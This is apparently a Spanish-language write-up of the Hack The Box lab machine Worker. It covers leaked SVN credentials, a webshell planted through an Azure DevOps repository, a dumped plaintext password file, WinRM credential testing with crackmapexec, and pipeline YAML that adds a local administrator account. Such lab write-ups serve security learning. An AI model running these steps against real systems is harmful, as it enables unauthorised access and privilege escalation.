---
layout: post
title: Write-Up Máquina Worker HTB
date: 2021-01-30 16:00 +0800
last_modified_at: 2021-01-30 16:10 +0800
tags: [htb, writeup, windows, microsoft, azure, devops, svn, crackmapexec, pipelines, WinRM]
toc:  true
---

![Worker-Info-Card](/assets/imagenes/2021-01-30-worker-HTB/Worker-info-card.png)

---
## Introducción

La máquina Worker, es una máquina windows con una dificultad media. La explotación de esta máquina consta primero de la enumeración de un apache subversion con el que descubriremos un subdominio y unas credenciales validas para dicho subdominio. Despues utilizaremos dicho subdominio, el cual es un portal de azure devops, para subir una webshell a la raíz de otro subdominio, el cual es el nombre del repo. Después enumeraremos y encontraremos una lista de usuarios y passwords, en la cual solamente hay uno válido. Para la escalada de privilegios, vamos a hacer uso de los azure pipe lines, para crear un usuario el cual meteremos al grupo de administradores.

---
## Escaneo

![Worker-scan](/assets/imagenes/2021-01-30-worker-HTB/Worker-nmap-scan.png)

La máquina tiene 3 puertos abiertos:
* 80: Microsoft IIS httpd 10.0(http)
* 3690: Apache Subversion
* 5985: Microsoft HTTPAPI httpd 2.0

### Puerto 80

En el puerto 80 nos encontramos con un servidor Microsoft IIS con la pagina por defecto. Si enumeramos vemos que por ahora no podemos hacer nada.

![Worker-puerto-80](/assets/imagenes/2021-01-30-worker-HTB/Worker-Puerto-80.png)

### Puerto 3690

En el puerto 3690 nos encontramos con un [Apache Subversion](https://en.wikipedia.org/wiki/Apache_Subversion). Este servicio es utilizado para llevar registros de cambios en repositorios de entornos Dev-Ops. En este caso vamos a comprobar si podemos interactuar con el utilizándo el comando *svn ls svn://10.10.10.203/*

![worker-svn-ls](/assets/imagenes/2021-01-30-worker-HTB/Worker-svn-ls.png)

### Puerto 5985

En el Puerto 5985 nos encontramos con un Microsoft HTTPAPI.

---
## Enumeración

Vamos a empezar la enumeración por el Apache Subversion, ya que es de lo que a priori más información podemos sacar, porque como hemos visto podemos interactuar con ello sin ningún tipo de autenticación.

Lo primero que vamos a hacer es descargar el contenido del servidor a nuestra máquina.
Esto lo hacemos utilizando el commando *svn checkout svn://10.10.10.203/*

![Worker-svn-checkout](/assets/imagenes/2021-01-30-worker-HTB/Worker-svn-checkout.png)

Esto nos descargará el contenido en la carpeta en la que estemos.
Si nos fijamos bien, vemos que tenemos en la raíz una carpeta llamada *dimension.worker.htb*, la cual claramente es un subdominio, y un fichero llamado *moved.txt*. Si abrimos el fichero, se hace referencia a un subdominio al que se ha migrado el repositorio (devops.worker.htb).

Sabiendo esto, vamos primero a añadir los subdominios a /etc/hosts y vamos a acceder.

![Worker-devops-worker-htb](/assets/imagenes/2021-01-30-worker-HTB/Worker-devops-worker-htb.png)
![Worker-dimension-worker-htb](/assets/imagenes/2021-01-30-worker-HTB/Worker-dimension-worker-htb.png)

Vemos que *devops.worker.htb* esta protegido por contraseña y si buscamos en los ficheros no encontramos ningun tipo de credencial.

Leyendo documentacion sobre Apache subversion, tenemos la opcion de descargar revisiones historicas de los repositorios.

![worker-svn-r-2](/assets/imagenes/2021-01-30-worker-HTB/Worker-svn-r-2.png)

Vemos que en la revision 2 se añade un fichero llamado Deploy.ps1.

![Worker-deploy-ps1](/assets/imagenes/2021-01-30-worker-HTB/Worker-deploy-ps1.png)

En este archivo encontramos unas credenciales:
* Username: nathen
* Password: wendel98

vamos a probarlas en **devops.worker.htb**:

![Worker-devops-worker-htb-nathen](/assets/imagenes/2021-01-30-worker-HTB/Worker-devops-worker-htb-nathen.png)

Una vez hemos accedido vemos un proyecto llamado SmartHotel360. Si accedemos y nos vamos al apartado de repositorios, nos encontramos con los ficheros de lo que parece ser una aplicacion web. Vemos tambien que el nombre del repo es spectral, por lo que vamos a añadirlo como subdominio a /etc/hosts.

![Worker-spectral-repo](/assets/imagenes/2021-01-30-worker-HTB/Worker-spectral-repo.png)

Efectivamente, spectral es el subdominio en el que el repo está hosteado. Ya que los ficheros del repo son los mismos que los de el subdominio *spectral.worker.htb* vamos a subir al repositorio una webshell.

---
## Explotación

1. Descargamos el repo a nuestra maquina utilizando las credenciales del usuario nethan.
   * ![Worker-clone-spectral](/assets/imagenes/2021-01-30-worker-HTB/Worker-clone-spectral.png)
2. Creamos una branch llamada shell
   * ![Worker-shell-branch](/assets/imagenes/2021-01-30-worker-HTB/Worker-shell-branch.png)
3. Copiamos la webshell al directorio raíz de spectral y realizamos un compit de los cambios.
   * ![Worker-shell-uploaded](/assets/imagenes/2021-01-30-worker-HTB/Worker-shell-uploaded.png)
4. Realizamos un push a los ficheros para subirlos al repo de azure.
    * ![Worker-push-shell](/assets/imagenes/2021-01-30-worker-HTB/Worker-push-shell.png)
5. Hacemos un pull request de nuestra branch para incorporarla al master.
   * ![Worker-pull-request](/assets/imagenes/2021-01-30-worker-HTB/Worker-pull-request.png)
6. Para realizar el pull request de manera correcta tenemos que seleccionar un work item, ya que si no, no nos funcionará.
   * ![worker-pull-work-item](/assets/imagenes/2021-01-30-worker-HTB/worker-pull-work-item.png)
7. Por último le damos a *create pull*, aprobamos los cambios, le damos a *Complete* y por último a *Complete merge*.
   * ![Worker-complete-pull](/assets/imagenes/2021-01-30-worker-HTB/Worker-complete-pull.png)
   * ![Worker-complete-merge](/assets/imagenes/2021-01-30-worker-HTB/Worker-complete-merge.png)

Comprobamos que el merge entre la branch shell y el repositorio master se ha realizado correctamente viendo los ficheros del master.

![Worker-check-master](/assets/imagenes/2021-01-30-worker-HTB/Worker-check-master.png)

Ya tenemos en la raíz de master nuestra webshell. Podríamos haber subido una reverse shell para que la enumeracion hubiese sido mas facil, pero en este caso como ya se donde encontrar lo que nos hace falta he subido una simple webshell.

Cuando hice la maquina utilicé la herramienta [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) para la enumeración.

Si vamos a http://spectral.worker.htb/cmdasp.aspx encontraremos nuestra webshell. En este caso para obtener el usuario, tendremos que ir al directorio W:\svnrepos\www\conf\

![Worker-dir-drive-W](/assets/imagenes/2021-01-30-worker-HTB/Worker-dir-drive-W.png)

Ahí veremos un fichero llamado passwd, el cual por el nombre resulta muy interesante.
si lo leemos veremos una lista de usuarios de servicio svnserve con las passwords en plano.

* Comando: type W:\svnrepos\www\conf\passwd

```conf
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```
---
## Movimiento Lateral

Con esta lista de usuarios, vamos a utilizar la herramienta [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) para ver si tenemos algún login válido para [WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal).

Primero vamos a separar los users de las passwords en dos ficheros separados.
* Users: cat passwd | tr -d =  | cut -f 1 -d " " > svn-users
* Passwords: cat passwd | tr -d =  | cut -f 3 -d " " > svn-passwd

![Worker-Users-Passwd](/assets/imagenes/2021-01-30-worker-HTB/Worker-Users-Passwd.png)

Una vez tengamos los usuarios separados de las passwords, vamos a usar, como ya he mencionado antes, la herramienta crackmapexec para probar los pares de credenciales en el servicio WinRM.
* Comando: crackmapexec winrm 10.10.10.203 -u svn-users -p svn-passwd --no-bruteforce

Lo que estamos ejecutando cuando realizamos el comando es probar en el servicio WinRM de la maquina Worker (10.10.10.203) los usuarios que tenemos en el fichero svn-users con la password del fichero svn-password que se encuentre en la misma linea que el usuario que esta intentando conectarse.

Si no le indicásemos la opción de --no-bruteforce, ejecutaría lo que se llama un ataque de [password spraying](https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/). Este ataque se basa en la existencia de varios usuarios validos y un numero limitado de contraseñas.
Lo que se haría entonces sería probar con esos usuarios todas las contraseñasque tengamos para cada uno de ellos.


```bash
crackmapexec winrm 10.10.10.203 -u svn-users -p svn-passwd --no-bruteforce                                                      
WINRM       10.10.10.203    5985   NONE             [*] None (name:10.10.10.203) (domain:None)
WINRM       10.10.10.203    5985   NONE             [*] http://10.10.10.203:5985/wsman
WINRM       10.10.10.203    5985   NONE             [-] None\nathen:wendel98
WINRM       10.10.10.203    5985   NONE             [-] None\nichin:fqerfqerf
WINRM       10.10.10.203    5985   NONE             [-] None\nichin:asifhiefh
WINRM       10.10.10.203    5985   NONE             [-] None\noahip:player
WINRM       10.10.10.203    5985   NONE             [-] None\nuahip:wkjdnw
WINRM       10.10.10.203    5985   NONE             [-] None\oakhol:bxwdjhcue
WINRM       10.10.10.203    5985   NONE             [-] None\owehol:supersecret
WINRM       10.10.10.203    5985   NONE             [-] None\paihol:painfulcode
WINRM       10.10.10.203    5985   NONE             [-] None\parhol:gitcommit
WINRM       10.10.10.203    5985   NONE             [-] None\pathop:iliketomoveit
WINRM       10.10.10.203    5985   NONE             [-] None\pauhor:nowayjose
WINRM       10.10.10.203    5985   NONE             [-] None\payhos:icanjive
WINRM       10.10.10.203    5985   NONE             [-] None\perhou:elvisisalive
WINRM       10.10.10.203    5985   NONE             [-] None\peyhou:ineedvacation
WINRM       10.10.10.203    5985   NONE             [-] None\phihou:pokemon
WINRM       10.10.10.203    5985   NONE             [-] None\quehub:pickme
WINRM       10.10.10.203    5985   NONE             [-] None\quihud:kindasecure
WINRM       10.10.10.203    5985   NONE             [-] None\rachul:guesswho
WINRM       10.10.10.203    5985   NONE             [-] None\raehun:idontknow
WINRM       10.10.10.203    5985   NONE             [-] None\ramhun:thisis
WINRM       10.10.10.203    5985   NONE             [-] None\ranhut:getting
WINRM       10.10.10.203    5985   NONE             [-] None\rebhyd:rediculous
WINRM       10.10.10.203    5985   NONE             [-] None\reeinc:iagree
WINRM       10.10.10.203    5985   NONE             [-] None\reeing:tosomepoint
WINRM       10.10.10.203    5985   NONE             [-] None\reiing:isthisenough
WINRM       10.10.10.203    5985   NONE             [-] None\renipr:dummy
WINRM       10.10.10.203    5985   NONE             [-] None\rhiire:users
WINRM       10.10.10.203    5985   NONE             [-] None\riairv:canyou
WINRM       10.10.10.203    5985   NONE             [-] None\ricisa:seewhich
WINRM       10.10.10.203    5985   NONE             [-] None\robish:onesare
WINRM       10.10.10.203    5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)
```

En este caso las credenciales para el usuario robisl son validas, por lo que vamos a poder obtener una sesión de WinRM con esas credenciales.
Para obtener nuestra sesión de WinRM, vamos a hacer uso de la herramienta [evil-WinRM](https://github.com/Hackplayers/evil-winrm).

![Worker-winrm-robisl](/assets/imagenes/2021-01-30-worker-HTB/Worker-winrm-robisl.png)

Efectivamente, hemos obtenido una sesión de WinRM con el usuario robisl.

![Worker-user-flag](/assets/imagenes/2021-01-30-worker-HTB/Worker-user-flag.png)

## Escalada De Privilegios

Una vez hemos obtenido la flag del usuario, vamos a probar a logearnos en el portal devops de azure para ver si hay algún otro repo que el usuario nathen no tenga.

![Worker-parts-unlimited](/assets/imagenes/2021-01-30-worker-HTB/Worker-parts-unlimited.png)

Efectivamente hay un repositorio que el usuario nathen no tenía. Este repo si lo analizamos bien, no es como el anterior, ya que en este no hay una web que corra los ficheros que tenemos en el propio repo. Para la exploitación, vamos a hacer uso de los [pipe lines de azure](https://docs.microsoft.com/en-us/azure/devops/pipelines/get-started/what-is-azure-pipelines?view=azure-devops).

Para esto, vamos a ir a Pipelines y vamos a crear una nueva.

![Worker-new-pipeline](/assets/imagenes/2021-01-30-worker-HTB/Worker-new-pipeline.png)

Una vez aqui, seleccionamos *Azure Repos Git*.

![Worker-azure-repo-git](/assets/imagenes/2021-01-30-worker-HTB/Worker-azure-repo-git.png)

En el siguiente paso seleccionamos PartsUnlimited que es el unico repo que tiene el user robisl y seleccionamos *Starter pipeline*.

![Worker-starter-pipeline](/assets/imagenes/2021-01-30-worker-HTB/Worker-starter-pipeline.png)


En el siguiente paso, tenemos que editar el fichero yml para indicarle lo que queremos que haga.

En este caso, vamos primero a ejecutar el comando whoami para ver que usuario es el que ejecuta los comandos. En la pipeline original, hay un parametro llamado pool que tenemos que quitar, ya que en este caso nos dara error si lo dejamos.

```yml
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- master

steps:
- script: echo Hello, world!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo See https://aka.ms/yaml
    whoami
    net users
  displayName: 'Run a multi-line script'
  ```

Una vez editada, le damos a *save and run* y nos pedirá una serie de datos.

![Worker-save-and-run-whoami](/assets/imagenes/2021-01-30-worker-HTB/Worker-save-and-run-whoami.png)

![Worker-whoami-check](/assets/imagenes/2021-01-30-worker-HTB/Worker-whoami-check.png)

Como podemos ver, aunque ha fallado, porque el segundo comando que le he indicado a devuelto un status de salida igual a 1 vemos que el usuario que ejecuta todo esto es system.

Ya que somos system, podriamos tirar una reverse shell, pero en este caso para trabajar de forma más comoda, vamos a crear un usuario en el sistema y lo vamos a meter en el grupo de administradores.

Vamos a crear una nueva pipe line y vamos a hacer que ejecute *net user admin Contraseña1 /add ; net localgroup administrators admin /add*.

```yml
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- master


steps:
- script: echo Hello, world!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo See https://aka.ms/yaml
    net user admin Contraseña1 /add
    net localgroup administrators admin /add
  displayName: 'Run a multi-line script'
```
![Worker-admin-user-added](/assets/imagenes/2021-01-30-worker-HTB/Worker-admin-user-added.png)

Ahora en un principio deberiamos poder iniciar sesión con el usuario *admin* con la password *Contraseña1* en WinRM.

![Worker-user-admin](/assets/imagenes/2021-01-30-worker-HTB/Worker-user-admin.png)

Como podemos ver, iniciamos sesion con el usuario admin sin ningun tipo de problema.

![Worker-flag-root](/assets/imagenes/2021-01-30-worker-HTB/Worker-flag-root.png)

